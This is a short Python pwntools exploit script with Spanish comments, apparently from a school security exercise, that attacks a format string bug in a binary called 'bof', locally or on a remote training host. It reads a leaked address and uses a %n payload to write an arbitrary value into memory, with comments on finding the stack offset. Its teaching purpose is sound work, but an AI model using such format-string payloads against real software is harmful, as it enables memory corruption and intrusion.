#!/usr/bin/python3
########################################################################
# String format Bug
########################################################################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10013

gs = '''
b main
continue
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)


io = start()

io.recvuntil(": ")
leak = int(io.recvline(), 16)
print(hex(leak))


#printf("0123456789%n", &caracteresEscritos); En la variable caracteresEscritos se escribe 10.
#¿Como usamos el modificador %n para escribir de forma arbitraria en memoria?

#payload = p32(leak)+ b"AAAA||%10$x||" #Buscamos donde está la dirección de memoria en el stack.
#payload = p32(leak) + b"%10c%10$n" # Cuando ya sabemos donde se encuentra la dirección de memoria podemos escribir en ella.
# Sabemos que la dirección de memoria sería el parámetro número 10 de printf.
# En el ejemplo anterior escribimos 4+10=14 4 bytes de la dirección de memoria más el valor 10.

#Finalmente escribimos 123456-4(ya escritos en la dirección de memoria) espacios en la variable.
payload = p32(leak) + b"%123452c%10$n"
io.sendline(payload)


io.interactive()
